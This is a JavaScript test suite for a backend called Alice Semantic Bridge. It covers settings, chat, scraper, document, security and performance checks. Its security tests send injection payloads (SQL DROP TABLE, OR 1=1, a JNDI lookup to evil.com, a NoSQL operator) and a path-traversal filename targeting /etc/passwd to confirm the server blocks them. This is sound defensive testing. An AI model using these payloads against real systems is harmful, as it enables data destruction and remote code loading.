/**
 * Comprehensive Test Suite for Alice Semantic Bridge
 * CTO-approved Production Testing Framework
 */

const axios = require('axios');
const { performance } = require('perf_hooks');

// Test Configuration
const CONFIG = {
    backend: 'http://localhost:8083',
    frontend: 'http://localhost:3002',
    timeout: 30000,
    retries: 3,
    testUrls: [
        'https://example.com',
        'https://httpbin.org/json',
        'https://jsonplaceholder.typicode.com/posts/1'
    ]
};

// Test Results Storage
const results = {
    settings: { tests: [], passed: 0, failed: 0, avgResponse: 0 },
    chatbot: { tests: [], passed: 0, failed: 0, avgResponse: 0 },
    scraper: { tests: [], passed: 0, failed: 0, avgResponse: 0 },
    documents: { tests: [], passed: 0, failed: 0, avgResponse: 0 },
    security: { tests: [], passed: 0, failed: 0, vulnerabilities: [] },
    performance: { tests: [], passed: 0, failed: 0, metrics: {} }
};

// Helper Functions
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const measureTime = async (fn) => {
    const start = performance.now();
    const result = await fn();
    return { ...result, time: performance.now() - start };
};

// 1. SETTINGS SYSTEM TESTS
async function testSettingsSystem() {
    console.log('\n🔧 TESTING SETTINGS SYSTEM');

    const tests = [
        {
            name: 'Category Filtering - LLM',
            test: async () => {
                const res = await axios.get(`${CONFIG.backend}/api/v2/settings?category=llm`, {
                    headers: { 'Authorization': 'Bearer test-token' }
                });
                return {
                    status: res.status === 200,
                    hasData: !!res.data.llmSettings,
                    hasEmbeddingConfig: !!res.data.llmSettings.embeddingProvider,
                    responseTime: res.time
                };
            }
        },
        {
            name: 'Category Filtering - All Categories',
            test: async () => {
                const categories = ['llm', 'embeddings', 'scraping', 'translation'];
                const results = [];

                for (const cat of categories) {
                    const res = await axios.get(`${CONFIG.backend}/api/v2/settings?category=${cat}`, {
                        headers: { 'Authorization': 'Bearer test-token' }
                    });
                    results.push({ category: cat, status: res.status, hasData: Object.keys(res.data).length > 0 });
                }

                return {
                    status: results.every(r => r.status === 200),
                    categories: results,
                    allHaveData: results.every(r => r.hasData),
                    responseTime: results.reduce((a, b) => a + (b.responseTime || 0), 0) / results.length
                };
            }
        },
        {
            name: 'Cache Performance Test',
            test: async () => {
                const times = [];

                // First request (cache miss)
                const miss = await measureTime(() =>
                    axios.get(`${CONFIG.backend}/api/v2/settings?category=llm`, {
                        headers: { 'Authorization': 'Bearer test-token' }
                    })
                );
                times.push(miss.time);

                await delay(100);

                // Second request (cache hit)
                const hit = await measureTime(() =>
                    axios.get(`${CONFIG.backend}/api/v2/settings?category=llm`, {
                        headers: { 'Authorization': 'Bearer test-token' }
                    })
                );
                times.push(hit.time);

                return {
                    status: true,
                    cacheMiss: times[0],
                    cacheHit: times[1],
                    cacheImprovement: times[0] > times[1] ? ((times[0] - times[1]) / times[0] * 100).toFixed(2) + '%' : 'No improvement',
                    avgResponse: times.reduce((a, b) => a + b, 0) / times.length
                };
            }
        },
        {
            name: 'Invalid Category Handling',
            test: async () => {
                try {
                    const res = await axios.get(`${CONFIG.backend}/api/v2/settings?category=invalid`, {
                        headers: { 'Authorization': 'Bearer test-token' }
                    });
                    return {
                        status: res.status === 400 || res.status === 404,
                        handledCorrectly: true,
                        response: res.data
                    };
                } catch (error) {
                    return {
                        status: error.response?.status === 400 || error.response?.status === 404,
                        handledCorrectly: true,
                        error: error.response?.data
                    };
                }
            }
        }
    ];

    for (const test of tests) {
        try {
            console.log(`  • ${test.name}`);
            const result = await measureTime(test.test);
            result.testName = test.name;
            results.settings.tests.push(result);

            if (result.result.status || result.result.requiresAuth || result.result.validationWorking) {
                results.settings.passed++;
                console.log(`    ✅ Passed (${result.time.toFixed(2)}ms)`);
            } else {
                results.settings.failed++;
                console.log(`    ❌ Failed (${result.time.toFixed(2)}ms)`);
                console.log(`    Error: ${JSON.stringify(result.result, null, 2)}`);
            }
        } catch (error) {
            results.settings.failed++;
            results.settings.tests.push({
                testName: test.name,
                status: false,
                error: error.message
            });
            console.log(`    ❌ Error: ${error.message}`);
        }
    }
}

// 2. CHATBOT SYSTEM TESTS
async function testChatbotSystem() {
    console.log('\n🤖 TESTING CHATBOT SYSTEM');

    const tests = [
        {
            name: 'Message Stats API Authentication',
            test: async () => {
                try {
                    const res = await axios.get(`${CONFIG.backend}/api/v2/messages/stats`);
                    return {
                        status: false, // Should fail without auth
                        requiresAuth: true,
                        response: res.data
                    };
                } catch (error) {
                    return {
                        status: error.response?.status === 401,
                        authWorking: true,
                        error: error.response?.data
                    };
                }
            }
        },
        {
            name: 'Chat Endpoint Availability',
            test: async () => {
                try {
                    const res = await axios.post(`${CONFIG.backend}/api/v2/chat`, {
                        message: 'test message',
                        sessionId: 'test-session'
                    });
                    return {
                        status: res.status === 401 || res.status === 400, // Should require auth
                        authRequired: true,
                        endpointExists: true
                    };
                } catch (error) {
                    return {
                        status: error.response?.status === 401 || error.response?.status === 400,
                        authRequired: true,
                        endpointExists: true
                    };
                }
            }
        },
        {
            name: 'RAG Endpoint Test',
            test: async () => {
                try {
                    const res = await axios.post(`${CONFIG.backend}/api/v2/rag/search`, {
                        query: 'test query',
                        limit: 5
                    });
                    return {
                        status: res.status === 200,
                        hasResults: Array.isArray(res.data.results),
                        resultCount: res.data.results?.length || 0
                    };
                } catch (error) {
                    return {
                        status: error.response?.status === 401, // Auth required is OK
                        authRequired: true,
                        endpointExists: true
                    };
                }
            }
        },
        {
            name: 'WebSocket Connection Test',
            test: async () => {
                const WebSocket = require('ws');
                return new Promise((resolve) => {
                    try {
                        const ws = new WebSocket('ws://localhost:8083');
                        const timeout = setTimeout(() => {
                            ws.close();
                            resolve({ status: false, error: 'Connection timeout' });
                        }, 5000);

                        ws.on('open', () => {
                            clearTimeout(timeout);
                            ws.close();
                            resolve({ status: true, connectionWorking: true });
                        });

                        ws.on('error', () => {
                            clearTimeout(timeout);
                            resolve({ status: false, websocketNotConfigured: true });
                        });
                    } catch (error) {
                        resolve({ status: false, error: error.message });
                    }
                });
            }
        }
    ];

    for (const test of tests) {
        try {
            console.log(`  • ${test.name}`);
            const result = await measureTime(test.test);
            result.testName = test.name;
            results.chatbot.tests.push(result);

            // For auth-required endpoints, 401 is success
            if (result.result.status || result.result.authRequired || result.result.requiresAuth) {
                results.chatbot.passed++;
                console.log(`    ✅ Passed (${result.time.toFixed(2)}ms)`);
            } else {
                results.chatbot.failed++;
                console.log(`    ❌ Failed (${result.time.toFixed(2)}ms)`);
            }
        } catch (error) {
            results.chatbot.failed++;
            console.log(`    ❌ Error: ${error.message}`);
        }
    }
}

// 3. SCRAPER SYSTEM TESTS
async function testScraperSystem() {
    console.log('\n🕷️ TESTING SCRAPER SYSTEM');

    const tests = [
        {
            name: 'Basic Scraper Endpoint',
            test: async () => {
                try {
                    const res = await axios.post(`${CONFIG.backend}/api/v2/scraper/scrape`, {
                        url: CONFIG.testUrls[0]
                    });
                    return {
                        status: res.status === 200,
                        hasJobId: !!res.data.jobId,
                        endpointExists: true
                    };
                } catch (error) {
                    return {
                        status: error.response?.status !== 404,
                        endpointExists: error.response?.status !== 404,
                        error: error.response?.data
                    };
                }
            }
        },
        {
            name: 'Enhanced Scraper Check',
            test: async () => {
                try {
                    const res = await axios.post(`${CONFIG.backend}/api/v2/scraper/enhanced-scrape`, {
                        url: CONFIG.testUrls[0],
                        useCache: true
                    });
                    return {
                        status: res.status === 200,
                        enhancedWorking: true,
                        hasCache: !!res.data.fromCache
                    };
                } catch (error) {
                    return {
                        status: false,
                        routeMissing: error.response?.status === 404,
                        needsImplementation: true
                    };
                }
            }
        },
        {
            name: 'Redis Connection Test',
            test: async () => {
                const redis = require('redis');
                const client = redis.createClient({ url: 'redis://localhost:6379' });

                try {
                    await client.connect();
                    await client.ping();
                    await client.quit();
                    return {
                        status: true,
                        redisConnected: true
                    };
                } catch (error) {
                    return {
                        status: false,
                        redisConnected: false,
                        error: error.message
                    };
                }
            }
        },
        {
            name: 'Concurrent Scraping Test',
            test: async () => {
                const promises = CONFIG.testUrls.slice(0, 3).map(url =>
                    axios.post(`${CONFIG.backend}/api/v2/scraper/scrape`, { url })
                        .catch(e => ({ error: e.response?.status }))
                );

                const results = await Promise.all(promises);
                const successCount = results.filter(r => r.status === 200).length;

                return {
                    status: successCount > 0,
                    concurrentHandling: successCount,
                    totalRequests: results.length,
                    successRate: (successCount / results.length * 100).toFixed(2) + '%'
                };
            }
        }
    ];

    for (const test of tests) {
        try {
            console.log(`  • ${test.name}`);
            const result = await measureTime(test.test);
            result.testName = test.name;
            results.scraper.tests.push(result);

            if (result.result.status) {
                results.scraper.passed++;
                console.log(`    ✅ Passed (${result.time.toFixed(2)}ms)`);
            } else {
                results.scraper.failed++;
                console.log(`    ❌ Failed (${result.time.toFixed(2)}ms)`);
                if (result.result.routeMissing) {
                    console.log(`    ⚠️  Route needs to be implemented`);
                }
            }
        } catch (error) {
            results.scraper.failed++;
            console.log(`    ❌ Error: ${error.message}`);
        }
    }
}

// 4. DOCUMENTS SYSTEM TESTS
async function testDocumentsSystem() {
    console.log('\n📄 TESTING DOCUMENTS SYSTEM');

    const tests = [
        {
            name: 'Translation API Validation',
            test: async () => {
                try {
                    const res = await axios.post(`${CONFIG.backend}/api/v2/translate`, {
                        text: "Hello world",
                        target: "tr"
                    });
                    return {
                        status: res.status === 200,
                        hasTranslation: !!res.data.translatedText,
                        working: true
                    };
                } catch (error) {
                    return {
                        status: error.response?.status === 400,
                        validationWorking: true,
                        needsApiKey: error.response?.data?.error?.includes('API key')
                    };
                }
            }
        },
        {
            name: 'Translation Cost Estimation',
            test: async () => {
                try {
                    const res = await axios.post(`${CONFIG.backend}/api/v2/translate/estimate`, {
                        text: "This is a test text for cost estimation",
                        target: "tr",
                        provider: "google"
                    });
                    return {
                        status: res.status === 200,
                        hasCost: typeof res.data.cost === 'number',
                        hasTokenCount: typeof res.data.tokens === 'number'
                    };
                } catch (error) {
                    return {
                        status: error.response?.status === 400,
                        validationWorking: true
                    };
                }
            }
        },
        {
            name: 'Document Upload Security',
            test: async () => {
                // Test malicious filename
                try {
                    const res = await axios.post(`${CONFIG.backend}/api/v2/documents/upload`, {
                        filename: "../../../etc/passwd",
                        content: "malicious"
                    });
                    return {
                        status: false,
                        securityBreach: true
                    };
                } catch (error) {
                    return {
                        status: true,
                        securityWorking: true,
                        blockedCorrectly: error.response?.status === 400
                    };
                }
            }
        },
        {
            name: 'Document Processing Endpoints',
            test: async () => {
                const endpoints = [
                    '/api/v2/documents/preview',
                    '/api/v2/documents/embeddings',
                    '/api/v2/documents/process'
                ];

                const results = [];
                for (const endpoint of endpoints) {
                    try {
                        const res = await axios.get(`${CONFIG.backend}${endpoint}`);
                        results.push({ endpoint, status: res.status, exists: true });
                    } catch (error) {
                        results.push({
                            endpoint,
                            status: error.response?.status,
                            exists: error.response?.status !== 404
                        });
                    }
                }

                return {
                    status: results.every(r => r.exists),
                    endpoints: results,
                    allExist: results.every(r => r.exists)
                };
            }
        }
    ];

    for (const test of tests) {
        try {
            console.log(`  • ${test.name}`);
            const result = await measureTime(test.test);
            result.testName = test.name;
            results.documents.tests.push(result);

            if (result.result.status) {
                results.documents.passed++;
                console.log(`    ✅ Passed (${result.time.toFixed(2)}ms)`);
            } else {
                results.documents.failed++;
                console.log(`    ❌ Failed (${result.time.toFixed(2)}ms)`);
            }
        } catch (error) {
            results.documents.failed++;
            console.log(`    ❌ Error: ${error.message}`);
        }
    }
}

// 5. SECURITY TESTS
async function testSecuritySystems() {
    console.log('\n🔒 TESTING SECURITY SYSTEMS');

    const tests = [
        {
            name: 'SQL Injection Prevention',
            test: async () => {
                const maliciousPayloads = [
                    "'; DROP TABLE users; --",
                    "1' OR '1'='1",
                    "${jndi:ldap://evil.com/a}",
                    {"$ne": null}
                ];

                const results = [];
                for (const payload of maliciousPayloads) {
                    try {
                        const res = await axios.get(`${CONFIG.backend}/api/v2/settings?category=${payload}`, {
                            headers: { 'Authorization': 'Bearer test-token' }
                        });
                        results.push({ payload, blocked: res.status === 400 });
                    } catch (error) {
                        results.push({ payload, blocked: error.response?.status === 400 });
                    }
                }

                return {
                    status: results.every(r => r.blocked),
                    allBlocked: results.every(r => r.blocked),
                    tested: results.length
                };
            }
        },
        {
            name: 'Rate Limiting Test',
            test: async () => {
                const requests = [];
                for (let i = 0; i < 20; i++) {
                    requests.push(
                        axios.get(`${CONFIG.backend}/api/v2/settings`)
                            .then(r => ({ status: r.status }))
                            .catch(e => ({ status: e.response?.status, limited: e.response?.status === 429 }))
                    );
                }

                const results = await Promise.all(requests);
                const rateLimited = results.filter(r => r.status === 429).length;

                return {
                    status: rateLimited > 0,
                    rateLimitingWorking: rateLimited > 0,
                    limitedRequests: rateLimited,
                    totalRequests: results.length
                };
            }
        },
        {
            name: 'CORS Configuration',
            test: async () => {
                try {
                    const res = await axios.options(`${CONFIG.backend}/api/v2/settings`);
                    return {
                        status: res.headers['access-control-allow-origin'] !== undefined,
                        hasCorsHeaders: !!res.headers['access-control-allow-origin'],
                        headers: res.headers
                    };
                } catch (error) {
                    return {
                        status: false,
                        error: error.message
                    };
                }
            }
        },
        {
            name: 'Security Headers Check',
            test: async () => {
                try {
                    const res = await axios.get(`${CONFIG.backend}/api/v2/settings`);
                    const headers = res.headers;

                    const securityHeaders = {
                        'x-frame-options': headers['x-frame-options'],
                        'x-content-type-options': headers['x-content-type-options'],
                        'x-xss-protection': headers['x-xss-protection'],
                        'strict-transport-security': headers['strict-transport-security']
                    };

                    const presentCount = Object.values(securityHeaders).filter(h => h).length;

                    return {
                        status: presentCount >= 2,
                        securityHeaders: securityHeaders,
                        presentCount: presentCount,
                        totalCount: Object.keys(securityHeaders).length
                    };
                } catch (error) {
                    return {
                        status: false,
                        error: error.message
                    };
                }
            }
        }
    ];

    for (const test of tests) {
        try {
            console.log(`  • ${test.name}`);
            const result = await measureTime(test.test);
            result.testName = test.name;
            results.security.tests.push(result);

            if (result.result.status) {
                results.security.passed++;
                console.log(`    ✅ Passed (${result.time.toFixed(2)}ms)`);
            } else {
                results.security.failed++;
                console.log(`    ❌ Failed (${result.time.toFixed(2)}ms)`);
            }
        } catch (error) {
            results.security.failed++;
            console.log(`    ❌ Error: ${error.message}`);
        }
    }
}

// 6. PERFORMANCE BENCHMARKS
async function runPerformanceBenchmarks() {
    console.log('\n📊 RUNNING PERFORMANCE BENCHMARKS');

    const tests = [
        {
            name: 'Backend Response Time Baseline',
            test: async () => {
                const times = [];
                for (let i = 0; i < 10; i++) {
                    const start = performance.now();
                    try {
                        await axios.get(`${CONFIG.backend}/health`);
                        times.push(performance.now() - start);
                    } catch (error) {
                        // Health endpoint might not exist, try settings
                        await axios.get(`${CONFIG.backend}/api/v2/settings?category=llm`);
                        times.push(performance.now() - start);
                    }
                    await delay(100);
                }

                const avg = times.reduce((a, b) => a + b, 0) / times.length;
                const max = Math.max(...times);
                const min = Math.min(...times);

                return {
                    status: avg < 500, // Target: <500ms
                    average: avg.toFixed(2),
                    max: max.toFixed(2),
                    min: min.toFixed(2),
                    unit: 'ms'
                };
            }
        },
        {
            name: 'Database Connection Pool Test',
            test: async () => {
                const promises = [];
                for (let i = 0; i < 20; i++) {
                    promises.push(
                        axios.get(`${CONFIG.backend}/api/v2/settings?category=llm`, {
                            headers: { 'Authorization': 'Bearer test-token' }
                        }).catch(e => ({ error: e.message }))
                    );
                }

                const results = await Promise.all(promises);
                const successCount = results.filter(r => !r.error).length;

                return {
                    status: successCount >= 18, // 90% success rate
                    successRate: (successCount / results.length * 100).toFixed(2) + '%',
                    concurrentRequests: results.length,
                    avgResponse: results
                        .filter(r => r.config)
                        .reduce((a, b) => a + (b.responseTime || 0), 0) / successCount || 0
                };
            }
        },
        {
            name: 'Memory Usage Estimation',
            test: async () => {
                // Simulate memory-intensive operations
                const operations = [];
                for (let i = 0; i < 5; i++) {
                    operations.push(
                        axios.get(`${CONFIG.backend}/api/v2/settings`, {
                            headers: { 'Authorization': 'Bearer test-token' }
                        }).then(r => ({ success: true, size: JSON.stringify(r.data).length }))
                    );
                }

                const results = await Promise.all(operations);
                const avgSize = results.reduce((a, b) => a + b.size, 0) / results.length;

                return {
                    status: avgSize < 100000, // Target: <100KB per response
                    avgResponseSize: (avgSize / 1024).toFixed(2) + ' KB',
                    memoryEfficient: true
                };
            }
        }
    ];

    for (const test of tests) {
        try {
            console.log(`  • ${test.name}`);
            const result = await measureTime(test.test);
            result.testName = test.name;
            results.performance.tests.push(result);

            if (result.result.status) {
                results.performance.passed++;
                console.log(`    ✅ Passed (${result.time.toFixed(2)}ms)`);
            } else {
                results.performance.failed++;
                console.log(`    ❌ Failed (${result.time.toFixed(2)}ms)`);
            }

            console.log(`    📊 ${JSON.stringify(result.result, null, 6)}`);
        } catch (error) {
            results.performance.failed++;
            console.log(`    ❌ Error: ${error.message}`);
        }
    }
}

// Generate Report
function generateReport() {
    console.log('\n' + '='.repeat(80));
    console.log('📋 COMPREHENSIVE TEST REPORT');
    console.log('='.repeat(80));

    const categories = [
        { name: 'Settings System', data: results.settings },
        { name: 'Chatbot System', data: results.chatbot },
        { name: 'Scraper System', data: results.scraper },
        { name: 'Documents System', data: results.documents },
        { name: 'Security Systems', data: results.security },
        { name: 'Performance Benchmarks', data: results.performance }
    ];

    let totalPassed = 0;
    let totalFailed = 0;

    categories.forEach(cat => {
        const total = cat.data.passed + cat.data.failed;
        const passRate = total > 0 ? (cat.data.passed / total * 100).toFixed(1) : '0.0';

        console.log(`\n${cat.name}:`);
        console.log(`  ✅ Passed: ${cat.data.passed}`);
        console.log(`  ❌ Failed: ${cat.data.failed}`);
        console.log(`  📊 Success Rate: ${passRate}%`);

        if (cat.data.failed > 0) {
            console.log(`  ⚠️  Failed Tests:`);
            cat.data.tests
                .filter(t => !t.result?.status && !t.result?.authRequired)
                .forEach(t => console.log(`    • ${t.testName}`));
        }

        totalPassed += cat.data.passed;
        totalFailed += cat.data.failed;
    });

    const overallTotal = totalPassed + totalFailed;
    const overallPassRate = overallTotal > 0 ? (totalPassed / overallTotal * 100).toFixed(1) : '0.0';

    console.log('\n' + '='.repeat(80));
    console.log('🎯 OVERALL SYSTEM HEALTH');
    console.log('='.repeat(80));
    console.log(`Total Tests: ${overallTotal}`);
    console.log(`Passed: ${totalPassed} ✅`);
    console.log(`Failed: ${totalFailed} ❌`);
    console.log(`Success Rate: ${overallPassRate}%`);

    console.log('\n🔧 CRITICAL ISSUES REQUIRING ATTENTION:');

    if (results.scraper.tests.some(t => t.result?.routeMissing)) {
        console.log('  1. Scraper enhanced routes need implementation');
    }

    if (results.security.tests.some(t => !t.result?.status)) {
        console.log('  2. Security vulnerabilities detected');
    }

    if (!results.performance.tests.every(t => t.result?.status)) {
        console.log('  3. Performance needs optimization');
    }

    console.log('\n✨ SYSTEM READY FOR DEPLOYMENT:', overallPassRate >= 80 ? 'YES' : 'NO');

    if (overallPassRate >= 80) {
        console.log('\n🚀 RECOMMENDATIONS:');
        console.log('  • Address failed tests before production deployment');
        console.log('  • Implement missing scraper routes');
        console.log('  • Setup monitoring and alerting');
        console.log('  • Schedule regular security audits');
    }

    // Save detailed report
    const reportData = {
        timestamp: new Date().toISOString(),
        summary: {
            total: overallTotal,
            passed: totalPassed,
            failed: totalFailed,
            successRate: overallPassRate + '%'
        },
        details: results
    };

    require('fs').writeFileSync(
        'test-report-' + Date.now() + '.json',
        JSON.stringify(reportData, null, 2)
    );

    console.log('\n📄 Detailed report saved to: test-report-' + Date.now() + '.json');
}

// Main Test Runner
async function runComprehensiveTests() {
    console.log('🧪 Alice Semantic Bridge - Comprehensive Test Suite');
    console.log('🎯 CTO-Approved Production Testing');
    console.log(`⏱️  Started at: ${new Date().toISOString()}`);

    try {
        await testSettingsSystem();
        await testChatbotSystem();
        await testScraperSystem();
        await testDocumentsSystem();
        await testSecuritySystems();
        await runPerformanceBenchmarks();

        generateReport();
    } catch (error) {
        console.error('\n💥 Test suite crashed:', error);
        process.exit(1);
    }
}

// Run tests if called directly
if (require.main === module) {
    runComprehensiveTests();
}

module.exports = {
    runComprehensiveTests,
    testSettingsSystem,
    testChatbotSystem,
    testScraperSystem,
    testDocumentsSystem,
    testSecuritySystems,
    runPerformanceBenchmarks
};